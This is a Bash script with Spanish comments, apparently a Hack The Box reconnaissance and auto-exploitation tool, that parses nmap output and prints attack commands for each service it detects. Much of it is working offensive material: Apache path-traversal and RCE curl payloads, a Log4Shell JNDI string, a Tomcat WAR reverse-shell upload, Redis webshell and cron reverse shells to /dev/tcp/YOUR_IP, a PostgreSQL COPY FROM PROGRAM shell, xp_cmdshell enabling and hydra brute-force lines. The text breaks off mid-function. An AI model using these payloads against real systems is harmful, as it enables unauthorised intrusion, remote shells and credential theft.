#!/bin/bash
# ============================================================
# usame.sh - Recon Guiado para Hack The Box v5.0
# Escanea, detecta servicios, genera reporte guiado
# con CVEs, auto-explotacion, privesc, post-explotacion,
# stealth mode, batch, wordlist, tracker, diff, auto-update.
#
# Uso:
#   sudo ./usame.sh <target>
#   sudo ./usame.sh <target> --fast --html
#   sudo ./usame.sh --stealth <target>
#   sudo ./usame.sh --batch targets.txt
#
#   # Verbosidad (muestra detalle paso a paso sin cortar la automatizacion)
#   sudo ./usame.sh <target> --verbose      # o -v
#   sudo ./usame.sh --batch targets.txt -v
#
#   # Modos auxiliares (NO requieren sudo)
#   ./usame.sh --creds <target>         # credenciales por defecto (usa XML existente)
#   ./usame.sh --creds-list             # listar todas las credenciales
#   ./usame.sh --creds-search TERM      # buscar credenciales
#   ./usame.sh --suid-list              # listar binarios SUID explotables
#   ./usame.sh --sudo-escalation        # listar escaladas via sudo
#   ./usame.sh --wordlist [cat]         # wordlists por escenario
#
#   sudo ./usame.sh --list
#   sudo ./usame.sh --diff <target>
#   sudo ./usame.sh --update-db
#   sudo ./usame.sh  (modo interactivo)
# ============================================================
#=================================================================banner==
SMOKE_BANNER='   _____ __  _______  __ __ ______        __  
  / ___//  |/  / __ \/ //_// ____/  _____/ /_ 
  \__ \/ /|_/ / / / / ,<  / __/    / ___/ __ \
 ___/ / /  / / /_/ / /| |/ /___ _ (__  ) / / /
/____/_/  /_/\____/_/ |_/_____/(_)____/_/ /_/ '
#===================================================================fin del banner
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TOOLS_DIR="$(dirname "$SCRIPT_DIR")"
REAL_USER="${SUDO_USER:-$USER}"
_OUTPUT_DIR_HOME="$(getent passwd "$REAL_USER" 2>/dev/null | cut -d: -f6)"
[ -z "$_OUTPUT_DIR_HOME" ] && _OUTPUT_DIR_HOME="$HOME"
if [ -n "$USAME_OUTPUT_DIR" ]; then
    OUTPUT_DIR="$USAME_OUTPUT_DIR"
elif [ -d "$_OUTPUT_DIR_HOME/Escritorio/escaneos" ]; then
    OUTPUT_DIR="$_OUTPUT_DIR_HOME/Escritorio/escaneos"
else
    OUTPUT_DIR="$_OUTPUT_DIR_HOME/escaneos"
fi
CVE_DB_DIR="$SCRIPT_DIR/lib"

# Colores
R='\e[31m'; G='\e[32m'; Y='\e[33m'; C='\e[36m'; M='\e[35m'; B='\e[1m'; W='\e[0m'; DIM='\e[2m'

# Caché de parseo del XML (una sola lectura por escaneo)
declare -g _XML_CONTENT=""
declare -gA _PORT_INFO
declare -gA _PORT_STATE

# ------------------------------------------------------------
# BANNER
# ------------------------------------------------------------
show_banner() {
    local colors=('\e[31m' '\e[33m' '\e[32m' '\e[36m' '\e[34m' '\e[35m')
    local i=0 line
    if command -v lolcat >/dev/null 2>&1; then
        printf '%s\n' "$SMOKE_BANNER" | lolcat
        return
    fi
    while IFS= read -r line; do
        printf '%b%s%b\n' "${colors[$((i % 6))]}" "$line" '\e[0m'
        i=$((i + 1))
    done <<< "$SMOKE_BANNER"
}

usage() {
    show_banner
    echo "Uso: sudo $0 <target_ip> [opciones]"
    echo ""
    echo "Escaneo:"
    echo "  --fast       Escaneo rapido (top 1000 puertos)"
    echo "  --full       Escaneo completo (scripts agresivos)"
    echo "  --stealth    Escaneo sigiloso (T2, fragmentado, decoys)"
    echo "  --no-scan    Re-generar reporte desde XML existente"
    echo "  --auto       Auto-explotar servicios detectados"
    echo "  --verbose/-v Salida detallada paso a paso (no bloquea la automatizacion)"
    echo ""
    echo "Batch:"
    echo "  --batch FILE Escanear multiples targets (1 IP por linea)"
    echo ""
    echo "Post-procesamiento:"
    echo "  --html       Exportar reporte a HTML con estilos"
    echo "  --wordlist [CAT] Generar wordlist/referencia por escenario"
    echo "  --diff       Comparar escaneos recientes del target"
    echo "  --web        Abrir Firefox en puertos web y agregar host a /etc/hosts"
    echo ""
    echo "Credenciales por defecto:"
    echo "  --creds <target>      Mostrar credenciales por defecto de un target"
    echo "  --creds-list          Listar todas las credenciales por defecto"
    echo "  --creds-search TERM   Buscar credenciales por nombre/termino"
    echo ""
    echo "SUID / Escalada:"
    echo "  --suid <target>       Escanear binarios SUID en el target"
    echo "  --suid-list           Listar binarios SUID explotables"
    echo "  --sudo-escalation     Listar escaladas via sudo"
    echo ""
    echo "Tracker:"
    echo "  --list       Listar todas las boxes escaneadas"
    echo "  --history NOMBRE Ver historial de una box"
    echo "  --mark NOMBRE STATUS  Marcar box como owned/rooted"
    echo ""
    echo "Base de datos:"
    echo "  --update-db  Actualizar CVEs desde NVD API"
    echo ""
    echo "  -h           Muestra esta ayuda"
    echo ""
    echo "  Sin argumentos: modo interactivo"
    exit "${1:-1}"
}

# ------------------------------------------------------------
# CARGAR LIBRERIAS
# ------------------------------------------------------------
load_libraries() {
    local libs=("services.sh" "cve_linux.sh" "cve_windows.sh" "postexploitation.sh" "default_creds.sh" "suid_binaries.sh" "wordlists.sh")
    for lib in "${libs[@]}"; do
        if [ ! -f "$CVE_DB_DIR/$lib" ]; then
            echo -e "${R}  [!] Libreria no encontrada: $CVE_DB_DIR/$lib${W}"
            exit 1
        fi
    done
    source "$CVE_DB_DIR/services.sh"
    source "$CVE_DB_DIR/cve_linux.sh"
    source "$CVE_DB_DIR/cve_windows.sh"
    source "$CVE_DB_DIR/postexploitation.sh"
    source "$CVE_DB_DIR/default_creds.sh"
    source "$CVE_DB_DIR/suid_binaries.sh"
    source "$CVE_DB_DIR/wordlists.sh"
}

# ------------------------------------------------------------
# XML PARSING FUNCTIONS
# ------------------------------------------------------------
get_open_ports() {
    if [ -n "$_XML_CONTENT" ]; then
        echo "$_XML_CONTENT" | grep -oP 'portid="\K[0-9]+' | sort -un
    else
        grep -oP 'portid="\K[0-9]+' "$XML_FILE" | sort -un
    fi
}

# Construye una sola vez el cache de puertos/servicios desde el XML.
# Elimina decenas de greps repetidos sobre el mismo archivo.
build_port_cache() {
    _XML_CONTENT=""
    _PORT_INFO=()
    _PORT_STATE=()
    [ ! -f "$XML_FILE" ] && return 1
    _XML_CONTENT=$(cat "$XML_FILE")
    local port state svc prod ver block
    for port in $(echo "$_XML_CONTENT" | grep -oP 'portid="\K[0-9]+' | sort -un); do
        block=$(echo "$_XML_CONTENT" | grep -A5 "portid=\"$port\"")
        state=$(echo "$block" | grep -oP 'state="\K\w+' | head -1)
        svc=$(echo "$block"  | grep -oP 'name="\K[^"]+' | head -1)
        prod=$(echo "$block" | grep -oP 'product="\K[^"]+' | head -1)
        ver=$(echo "$block"  | grep -oP 'version="\K[^"]+' | head -1)
        _PORT_STATE[$port]="$state"
        _PORT_INFO[$port]="$svc|$prod|$ver"
    done
    return 0
}

get_port_state() {
    local state="${_PORT_STATE[$1]}"
    if [ -n "$state" ]; then
        echo "$state"
        return
    fi
    grep -A3 "portid=\"$1\"" "$XML_FILE" | grep -oP 'state="\K\w+' | head -1
}

get_nmap_vulns() {
    local xml="${_XML_CONTENT:-$(cat "$XML_FILE" 2>/dev/null)}"
    echo "$xml" | grep -oP 'CVE-[0-9]+-[0-9]+' | sort -un
}

# ============================================================
# HELPER FUNCTIONS (DRY)
# ============================================================
to_lower() { echo "${1,,}"; }

# Matches producto/version sin romperse ante caracteres raros de nmap.
# Returns 0 si el product match (prodre) y el version match (verre) pasan.
# Cualquiera de los dos puede estar vacio para no filtrar.
is_prod_ver() {
    local prod="$1" ver="$2" prodre="$3" verre="$4"
    if [ -n "$prodre" ]; then
        echo "$prod" | grep -qiE "$prodre" || return 1
    fi
    if [ -n "$verre" ]; then
        [ -n "$ver" ] || return 1
        echo "$ver" | grep -qiE "$verre" || return 1
    fi
    return 0
}

# Helpers de vulnerabilidades concretas (DRY entre auto-exploit y Metasploit)
vsftpd_backdoor_vuln()  { is_prod_ver "$1" "$2" 'vsftpd'  '2\.3\.4'; }
apache_41773_vuln()     { is_prod_ver "$1" "$2" 'apache'  '2\.4\.49'; }
apache_42013_vuln()     { is_prod_ver "$1" "$2" 'apache'  '2\.4\.50'; }
apache_old_vuln()       { is_prod_ver "$1" "$2" 'apache'  '2\.2\.[0-9]'; }
drupal_wf_vuln()        { is_prod_ver "$1" "$2" 'drupal'  ''; }
iis60_webdav_vuln()     { is_prod_ver "$1" "$2" 'iis'     '6\.0'; }
bluekeep_vuln()         { is_prod_ver "$1" "$2" ''        'Windows 7|Server 2008'; }

# Construye un patrón grep -E seguro a partir de terminos sueltos,
# escapando meta-caracteres (p.ej. versiones "Apache/2.4.49 (Unix)").
build_cve_pattern() {
    local out="" t
    for t in $1; do
        t=$(printf '%s' "$t" | sed 's/[][\\*^$(){}+.?]/\\&/g')
        [ -n "$out" ] && out="$out|"
        out="$out$t"
    done
    [ -n "$out" ] && echo "$out"
}

get_port_info() {
    local port="$1"
    SVC_INFO=""; PROD_INFO=""; VER_INFO=""
    local cached="${_PORT_INFO[$port]}"
    if [ -n "$cached" ]; then
        IFS='|' read -r SVC_INFO PROD_INFO VER_INFO <<< "$cached"
        return
    fi
    local block
    block=$(grep -A5 "portid=\"$port\"" "$XML_FILE")
    SVC_INFO=$(echo "$block" | grep -oP 'name="\K[^"]+' | head -1)
    PROD_INFO=$(echo "$block" | grep -oP 'product="\K[^"]+' | head -1)
    VER_INFO=$(echo "$block" | grep -oP 'version="\K[^"]+' | head -1)
}

print_section() {
    local title="$1"
    echo -e "\n${B}${C}========================================================${W}"
    echo -e "${B}${C}  $title${W}"
    echo -e "${B}${C}========================================================${W}"
}

print_subsection() {
    local title="$1"
    echo -e "${B}${C}--------------------------------------------------------${W}"
    echo -e "${B}${C}  $title${W}"
    echo -e "${B}${C}--------------------------------------------------------${W}"
}

print_err()   { echo -e "${R}  [!] $1${W}"; }
print_warn()  { echo -e "${Y}  [*] $1${W}"; }
print_ok()    { echo -e "${G}  [+] $1${W}"; }
print_info()  { echo -e "${C}  [~] $1${W}"; }

# Verbosidad: solo muestran si --verbose/-v esta activo
vprint() { [ "$VERBOSE" -eq 1 ] && echo -e "${DIM}[verbose] $1${W}"; }
vrun()   { vprint "CMD: $*"; "$@"; }

show_cves_for_os() {
    local svc="$1" prod="${2:-}" ver="${3:-}"
    if [ "$DETECTED_OS" != "windows" ]; then
        get_linux_cve_info "$svc" "$prod" "$ver" 2>/dev/null
    fi
    if [ "$DETECTED_OS" != "linux" ]; then
        get_windows_cve_info "$svc" "$prod" "$ver" 2>/dev/null
    fi
}

get_quick_commands() {
    local svc="$1" port="$2"
    local sl=$(to_lower "$svc")
    case "$sl" in
        http|https)
            local proto="http"; [ "$sl" = "https" ] && proto="https"
            echo "  gobuster dir -u ${proto}://$TARGET/ -w /usr/share/wordlists/dirb/common.txt -t 50"
            echo "  nikto -h ${proto}://$TARGET"
            echo "  curl ${proto}://$TARGET/robots.txt"
            ;;
        smb|microsoft-ds|netbios-ssn)
            echo "  smbclient -L //$TARGET/ -N"
            echo "  enum4linux -a $TARGET"
            echo "  smbmap -H $TARGET -R"
            ;;
        ssh)
            echo "  hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4"
            ;;
        ftp)
            echo "  ftp anonymous@$TARGET"
            echo "  nmap --script ftp-syst,ftp-anon -p $port $TARGET"
            ;;
        mysql)
            echo "  mysql -h $TARGET -P $port -u root -p"
            echo "  hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$TARGET -t 4"
            ;;
        mssql|ms-sql-s|ms-sql-m)
            echo "  impacket-mssqlclient sa:@$TARGET -windows-auth"
            echo "  hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://$TARGET -t 4"
            ;;
        redis)
            echo "  redis-cli -h $TARGET -p $port INFO"
            ;;
        rdp|ms-wbt-server)
            echo "  hydra -l <user> -P /usr/share/wordlists/rockyou.txt rdp://$TARGET -t 1"
            ;;
        mongodb)
            echo "  mongosh $TARGET:$port"
            ;;
        ldap)
            echo "  ldapsearch -x -H ldap://$TARGET -b '' -s base namingContexts"
            ;;
        *)
            echo "  nmap --script vulners -sV -p $port $TARGET"
            ;;
    esac
}

write_msf_module() {
    local rc_file="$1" comment="$2" module="$3" port="$4"
    shift 4
    local extra_settings="$@"
    {
        echo "# $comment"
        echo "use $module"
        echo "set RHOSTS $TARGET"
        echo "set RHOST $TARGET"
        echo "set RPORT $port"
        # Configurar payload por defecto si el modulo abre sesion
        if [ "$MSF_NEED_PAYLOAD" -eq 1 ]; then
            echo "set PAYLOAD $MSF_PAYLOAD"
            echo "set LHOST $MY_IP"
            echo "set LPORT $MSF_LPORT"
        fi
        [ -n "$extra_settings" ] && echo "$extra_settings"
        echo "exploit"
        echo ""
    } >> "$rc_file"
}

# Detecta el SO del XML: primero por osmatch/os class (fingerprint real de
# nmap -O), y como fallback por los nombres de servicio. Usa _XML_CONTENT
# (cache de build_port_cache) para no releer el archivo.
detect_os() {
    local xml_content="${_XML_CONTENT:-$(cat "$XML_FILE" 2>/dev/null)}"
    local os_info
    os_info=$(echo "$xml_content" | grep -oP '<osmatch name="\K[^"]+' | head -5)
    if [ -z "$os_info" ]; then
        os_info=$(echo "$xml_content" | grep -oP '<os class="\K[^"]+' | head -5)
    fi
    DETECTED_OS="unknown"
    if echo "$os_info" | grep -qi 'windows'; then
        DETECTED_OS="windows"
    elif echo "$os_info" | grep -qiE 'linux|unix|bsd|solaris'; then
        DETECTED_OS="linux"
    fi
    if [ "$DETECTED_OS" = "unknown" ]; then
        local all_svcs
        all_svcs=$(echo "$xml_content" | grep -oP '<service name="\K[^"]+' | tr '\n' ' ')
        if echo "$all_svcs" | grep -qiE 'microsoft-iis|netbios|ms-wbt|mssql'; then
            DETECTED_OS="windows"
        elif echo "$all_svcs" | grep -qiE 'ssh|apache|nginx'; then
            DETECTED_OS="linux"
        fi
    fi
}

detect_ad() {
    DETECTED_AD=0
    local xml_content="${_XML_CONTENT:-$(cat "$XML_FILE" 2>/dev/null)}"
    local all_svcs
    all_svcs=$(echo "$xml_content" | grep -oP '<service name="\K[^"]+' | tr '\n' ' ')
    if echo "$all_svcs" | grep -qi 'ldap\|kerberos\|msrpc\|kpasswd'; then
        DETECTED_AD=1
    fi
    if echo "$xml_content" | grep -qi 'domain\|dc\.\|active.directory\|DC=.*DC='; then
        DETECTED_AD=1
    fi
}

# ============================================================
# BOX NAME & VERSION MANAGEMENT
# ============================================================
get_next_version() {
    local box_name="$1"
    local max_version=0
    for f in "$OUTPUT_DIR"/ESCANEO_de_${box_name}_v[0-9]*.txt; do
        if [ -f "$f" ]; then
            local ver=$(basename "$f" | grep -oP '_v\K[0-9]+' | head -1)
            if [ -n "$ver" ] && [ "$ver" -gt "$max_version" ]; then
                max_version=$ver
            fi
        fi
    done
    echo $((max_version + 1))
}

# ============================================================
# AUTO-EXPLOIT DATABASE EXPANDIDA
# ============================================================
get_auto_exploit() {
    local svc="$1" prod="$2" ver="$3" port="$4"
    local result=""
    local svc_lower=$(to_lower "$svc")

    case "$svc_lower" in
        ftp)
            if vsftpd_backdoor_vuln "$prod" "$ver"; then
                result="${result}  !!! VSFTPD 2.3.4 BACKDOOR (CVE-2011-2523) !!!\n"
                result="${result}  Exploit: nc $TARGET $port\n"
                result="${result}  Metasploit: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET; set RPORT $port; exploit'\n"
            fi
            if is_prod_ver "$prod" "$ver" 'proftpd' '1\.3\.[0-5]'; then
                result="${result}  !!! PROFTPD BACKDOOR (CVE-2015-3306) !!!\n"
                result="${result}  exploit: SITE CPFR / SITE CPTO\n"
                result="${result}  Metasploit: msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS $TARGET; set RPORT $port; exploit'\n"
            fi
            if is_prod_ver "$prod" "$ver" 'proftpd' '1\.3\.6'; then
                result="${result}  [*] ProFTPD detected - check mod_copy:\n"
                result="${result}    nmap --script ftp-proftpd-backdoor -p $port $TARGET\n"
            fi
            # FTP anonimo siempre se reporta
            result="${result}  [*] FTP detected - SIEMPRE probar:\n"
            result="${result}    ftp anonymous@$TARGET\n"
            result="${result}    nmap --script ftp-syst,ftp-vsftpd-backdoor,ftp-anon -p $port $TARGET\n"
            ;;
        http|https)
            if apache_41773_vuln "$prod" "$ver"; then
                result="${result}  !!! APACHE 2.4.49 PATH TRAVERSAL (CVE-2021-41773) !!!\n"
                result="${result}  curl http://$TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\n"
                result="${result}  curl http://$TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d cmd=id\n"
                result="${result}  Metasploit: msfconsole -q -x 'use exploit/multi/http/apache_normalize_path; set RHOSTS $TARGET; set RPORT $port; set TARGETURI /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh; exploit'\n"
            fi
            if apache_42013_vuln "$prod" "$ver"; then
                result="${result}  !!! APACHE 2.4.50 RCE (CVE-2021-42013) !!!\n"
                result="${result}  curl http://$TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh -d cmd=id\n"
                result="${result}  Metasploit: msfconsole -q -x 'use exploit/multi/http/apache_normalize_path; set RHOSTS $TARGET; set RPORT $port; set TARGETURI /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh; exploit'\n"
            fi
            if apache_old_vuln "$prod" "$ver"; then
                result="${result}  [*] Apache 2.2.x old - check Optionsbleed (CVE-2017-9798):\n"
                result="${result}    curl -X OPTIONS http://$TARGET/\n"
            fi
            if is_prod_ver "$prod" "$ver" 'nginx' ''; then
                result="${result}  [*] Nginx detected:\n"
                result="${result}    curl http://$TARGET/static../etc/passwd\n"
                result="${result}    nmap --script http-methods -p $port $TARGET\n"
            fi
            if is_prod_ver "$prod" "$ver" 'tomcat' ''; then
                result="${result}  [*] Tomcat Manager - brute force credenciales:\n"
                result="${result}    curl -u 'tomcat:tomcat' http://$TARGET:$port/manager/html\n"
                result="${result}    curl -u 'admin:admin' http://$TARGET:$port/manager/html\n"
                result="${result}    curl -u 'tomcat:s3cret' http://$TARGET:$port/manager/html\n"
                result="${result}    curl -u 'admin:password' http://$TARGET:$port/manager/html\n"
                result="${result}    hydra -l tomcat -P /usr/share/wordlists/rockyou.txt http-get://$TARGET:$port/manager/html -t 4\n"
                result="${result}  [!] Si obtienes creds - upload WAR shell:\n"
                result="${result}    msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war -o shell.war\n"
                result="${result}    curl -u 'tomcat:password' --upload-file shell.war 'http://$TARGET:$port/manager/text/deploy?path=/shell'\n"
            fi
            if is_prod_ver "$prod" "$ver" 'iis' ''; then
                result="${result}  [*] IIS detected:\n"
                result="${result}    gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,php,config,bak -t 50\n"
                result="${result}    nmap --script http-iis-short-name-brute,http-webdav-scan -p $port $TARGET\n"
                if iis60_webdav_vuln "$prod" "$ver"; then
                    result="${result}  !!! IIS 6.0 WebDAV BOF (CVE-2017-7269) !!!\n"
                    result="${result}  Metasploit: msfconsole -q -x 'use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS $TARGET; set RPORT $port; exploit'\n"
                fi
            fi
            if is_prod_ver "$prod" "$ver" 'jenkins' ''; then
                result="${result}  [*] Jenkins detected:\n"
                result="${result}    curl http://$TARGET:$port/api/json\n"
                result="${result}    curl http://$TARGET:$port/script\n"
                result="${result}    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://$TARGET:$port/script -t 4\n"
            fi
            if drupal_wf_vuln "$prod" "$ver"; then
                result="${result}  [*] Drupal detected:\n"
                result="${result}    Metasploit: msfconsole -q -x 'use exploit/multi/http/drupal_drupageddon2; set RHOSTS $TARGET; set RPORT $port; exploit'\n"
            fi
            if is_prod_ver "$prod" "$ver" 'wordpress|wp-' ''; then
                result="${result}  [*] WordPress detected:\n"
                result="${result}    wpscan --url http://$TARGET/ --enumerate ap,at,u\n"
                result="${result}    wpseku http://$TARGET/\n"
            fi
            if is_prod_ver "$prod" "$ver" 'spring' ''; then
                result="${result}  !!! Spring4Shell (CVE-2022-22965) !!!\n"
                result="${result}  Check: class.module.classLoader.resources.context.parent.pipeline.first.pattern\n"
            fi
            if is_prod_ver "$prod" "$ver" 'log4j|log4' ''; then
                result="${result}  !!! Log4Shell (CVE-2021-44228) !!!\n"
                result="${result}  payload: \${jndi:ldap://YOUR_IP:1389/a}\n"
            fi
            # HTTP siempre tiene recomendaciones genericas
            result="${result}  [*] HTTP general - fuzzing:\n"
            result="${result}    gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirb/common.txt -t 50\n"
            result="${result}    nikto -h http://$TARGET\n"
            result="${result}    curl http://$TARGET/robots.txt\n"
            result="${result}    curl http://$TARGET/sitemap.xml\n"
            ;;
        smb|microsoft-ds|netbios-ssn)
            result="${result}  [*] SMB - enumeration y exploits:\n"
            result="${result}    smbclient -L //$TARGET/ -N\n"
            result="${result}    enum4linux -a $TARGET\n"
            result="${result}    smbmap -H $TARGET -R\n"
            result="${result}    nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-ms10-061 -p $port $TARGET\n"
            result="${result}  [!] EternalBlue check (MS17-010):\n"
            result="${result}    Metasploit: msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set RPORT $port; exploit'\n"
            result="${result}    nmap --script smb-vuln-ms17-010 -p $port $TARGET\n"
            result="${result}  [!] Null session:\n"
            result="${result}    smbclient //$TARGET/IPC$ -N\n"
            result="${result}    rpcclient -U '' -N $TARGET\n"
            result="${result}  [!] CrackMapExec:\n"
            result="${result}    crackmapexec smb $TARGET\n"
            result="${result}    crackmapexec smb $TARGET -u '' -p ''\n"
            ;;
        ssh)
            result="${result}  [*] SSH - enumeration:\n"
            result="${result}    nmap --script ssh-auth-methods,ssh2-enum-algos,ssh-hostkey -p $port $TARGET\n"
            result="${result}    ssh-audit $TARGET -p $port\n"
            if echo "$ver" | grep -qE 'OpenSSH_[1-6]\.'; then
                result="${result}  [!] OpenSSH old version - possible vuln:\n"
                result="${result}    Metasploit: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS $TARGET; set RPORT $port; run'\n"
            fi
            result="${result}  [!] Brute force:\n"
            result="${result}    hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4\n"
            result="${result}    medusa -h $TARGET -u <user> -P /usr/share/wordlists/rockyou.txt -M ssh\n"
            ;;
        redis)
            result="${result}  [*] Redis SIN AUTH - exploits:\n"
            result="${result}    redis-cli -h $TARGET -p $port INFO\n"
            result="${result}    redis-cli -h $TARGET -p $port CONFIG GET dir\n"
            result="${result}    redis-cli -h $TARGET -p $port KEYS *\n"
            result="${result}  [1] SSH KEY INJECTION:\n"
            result="${result}    redis-cli -h $TARGET CONFIG SET dir /root/.ssh\n"
            result="${result}    redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys\n"
            result="${result}    redis-cli -h $TARGET SET key 'ssh-rsa AAAA... your_key ...'\n"
            result="${result}    redis-cli -h $TARGET SAVE\n"
            result="${result}  [2] WEBSHELL:\n"
            result="${result}    redis-cli -h $TARGET CONFIG SET dir /var/www/html\n"
            result="${result}    redis-cli -h $TARGET CONFIG SET dbfilename shell.php\n"
            result="${result}    redis-cli -h $TARGET SET payload '<?php system(\$_GET[\"cmd\"]); ?>'\n"
            result="${result}    redis-cli -h $TARGET SAVE\n"
            result="${result}  [3] CRON JOB:\n"
            result="${result}    redis-cli -h $TARGET CONFIG SET dir /var/spool/cron/crontabs\n"
            result="${result}    redis-cli -h $TARGET CONFIG SET dbfilename root\n"
            result="${result}    redis-cli -h $TARGET SET cron '*/1 * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'\n"
            result="${result}    redis-cli -h $TARGET SAVE\n"
            ;;
        mongodb)
            result="${result}  [*] MongoDB SIN AUTH:\n"
            result="${result}    mongosh $TARGET:$port\n"
            result="${result}    mongodump --host $TARGET --port $port\n"
            result="${result}  [!] Inside mongosh:\n"
            result="${result}    show dbs\n"
            result="${result}    use admin\n"
            result="${result}    db.users.find()\n"
            result="${result}    db.system.users.find()\n"
            ;;
        ldap)
            result="${result}  [*] LDAP anonymous bind:\n"
            result="${result}    ldapsearch -x -H ldap://$TARGET -b '' -s base namingContexts\n"
            result="${result}    ldapsearch -x -H ldap://$TARGET -b 'DC=domain,DC=com' '(objectClass=user)' samAccountName\n"
            result="${result}    ldapsearch -x -H ldap://$TARGET -b 'DC=domain,DC=com' '(objectClass=group)'\n"
            result="${result}  [!] Si AD detectado:\n"
            result="${result}    windapsearch -d domain.htb --dc $TARGET -U\n"
            result="${result}    bloodhound-python -d domain.htb -u user -p pass -c All -ns $TARGET\n"
            ;;
        mysql)
            result="${result}  [*] MySQL - credenciales default:\n"
            result="${result}    mysql -h $TARGET -P $port -u root -p\n"
            result="${result}    mysql -h $TARGET -P $port -u root -p ''\n"
            result="${result}    mysql -h $TARGET -P $port -u admin -p admin\n"
            result="${result}  [!] Brute force:\n"
            result="${result}    hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://$TARGET -t 4\n"
            result="${result}    hydra -l admin -P /usr/share/wordlists/rockyou.txt mysql://$TARGET -t 4\n"
            result="${result}  [!] Nmap:\n"
            result="${result}    nmap --script mysql-info,mysql-enum,mysql-empty-password -p $port $TARGET\n"
            result="${result}  [!] Si obtienes acceso:\n"
            result="${result}    SELECT version(); SHOW databases; SELECT user,authentication_string FROM mysql.user;\n"
            result="${result}    SELECT LOAD_FILE('/etc/passwd');\n"
            ;;
        mssql|ms-sql-s|ms-sql-m)
            result="${result}  [*] MSSQL - credenciales default:\n"
            result="${result}    impacket-mssqlclient sa:@$TARGET -windows-auth\n"
            result="${result}    impacket-mssqlclient sa:password@$TARGET\n"
            result="${result}    impacket-mssqlclient sa:Password1@$TARGET\n"
            result="${result}  [!] Brute force:\n"
            result="${result}    hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://$TARGET -t 4\n"
            result="${result}  [!] Nmap:\n"
            result="${result}    nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info -p $port $TARGET\n"
            result="${result}  [!] Si sysadmin:\n"
            result="${result}    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n"
            result="${result}    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n"
            result="${result}    EXEC xp_cmdshell 'whoami';\n"
            ;;
        postgresql)
            result="${result}  [*] PostgreSQL - credenciales default:\n"
            result="${result}    psql -h $TARGET -U postgres\n"
            result="${result}    psql -h $TARGET -U postgres -W\n"
            result="${result}  [!] Brute force:\n"
            result="${result}    hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://$TARGET -t 4\n"
            result="${result}  [!] Si obtienes acceso:\n"
            result="${result}    \\l (list databases)\n"
            result="${result}    SELECT pg_read_file('/etc/passwd');\n"
            result="${result}    SELECT * FROM pg_extension;\n"
            result="${result}  [!] CVE-2019-9193 COPY FROM PROGRAM (PostgreSQL 9.3-11.6):\n"
            result="${result}    COPY cmd_exec FROM '/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"';\n"
            ;;
        rdp|ms-wbt-server)
            result="${result}  [*] RDP - enumeration y brute force:\n"
            result="${result}    nmap --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info -p $port $TARGET\n"
            result="${result}    hydra -l <user> -P /usr/share/wordlists/rockyou.txt rdp://$TARGET -t 1\n"
            result="${result}    crowbar -b rdp -s $TARGET/32 -u <user> -C /usr/share/wordlists/rockyou.txt\n"
            result="${result}  [!] Si obtienes creds:\n"
            result="${result}    xfreerdp /u:<user> /p:<pass> /v:$TARGET /dynamic-resolution\n"
            result="${result}    xfreerdp /u:<user> /p:<pass> /v:$TARGET /drive:share,/tmp\n"
            result="${result}  [!] BlueKeep (CVE-2019-0708) - Windows 7/Server 2008:\n"
            result="${result}    Metasploit: msfconsole -q -x 'use exploit/windows/rdp/rdp_bluekeep_rce; set RHOSTS $TARGET; set RPORT $port; exploit'\n"
            ;;
        smtp)
            result="${result}  [*] SMTP - enumeracion:\n"
            result="${result}    nmap --script smtp-enum-users,smtp-open-relay -p $port $TARGET\n"
            result="${result}    telnet $TARGET $port\n"
            result="${result}    swaks --to test@test.com --from fake@fake.com --server $TARGET\n"
            result="${result}  [!] Enumerar usuarios:\n"
            result="${result}    VRFY root\n"
            result="${result}    VRFY admin\n"
            result="${result}    EXPN root\n"
            ;;
        pop3)
            result="${result}  [*] POP3 - brute force:\n"
            result="${result}    hydra -l <user> -P /usr/share/wordlists/rockyou.txt pop3://$TARGET -t 4\n"
            result="${result}    nc $TARGET 110\n"
            result="${result}    USER <user>\n"
            result="${result}    PASS <pass>\n"
            result="${result}    LIST\n"
            ;;
        imap)
            result="${result}  [*] IMAP - brute force:\n"
            result="${result}    hydra -l <user> -P /usr/share/wordlists/rockyou.txt imap://$TARGET -t 4\n"
            result="${result}    nc $TARGET 143\n"
            result="${result}    a001 LOGIN <user> <pass>\n"
            result="${result}    a002 LIST \"\" *\n"
            ;;
        telnet)
            result="${result}  [*] Telnet - credenciales default:\n"
            result="${result}    telnet $TARGET\n"
            result="${result}  [!] Brute force:\n"
            result="${result}    hydra -l <user> -P /usr/share/wordlists/rockyou.txt telnet://$TARGET -t 4\n"
            result="${result}  [!] Interceptar credenciales:\n"
            result="${result}    tcpdump -i eth0 port $port -A\n"
            ;;
        dns)
            result="${result}  [*] DNS - enumeracion:\n"
            result="${result}    dig axfr @$TARGET domain.htb\n"
            result="${result}    dnsenum domain.htb --dnsserver $TARGET\n"
